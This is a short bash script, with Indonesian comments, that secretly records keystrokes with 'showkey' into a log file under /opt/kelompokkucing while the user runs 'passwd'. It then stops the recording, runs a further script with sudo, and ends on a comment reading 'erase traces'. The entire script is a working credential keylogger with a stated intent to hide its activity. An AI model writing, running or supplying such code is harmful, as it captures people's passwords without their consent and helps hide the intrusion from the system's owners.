#!/bin/bash

# start record
FOLDER="kelompokkucing"
showkey > /opt/$FOLDER/logger.txt &

# run passwd
/usr/bin/passwd

# stop record
kill %1
# 
sudo /opt/$FOLDER/function.sh

# hapus jejak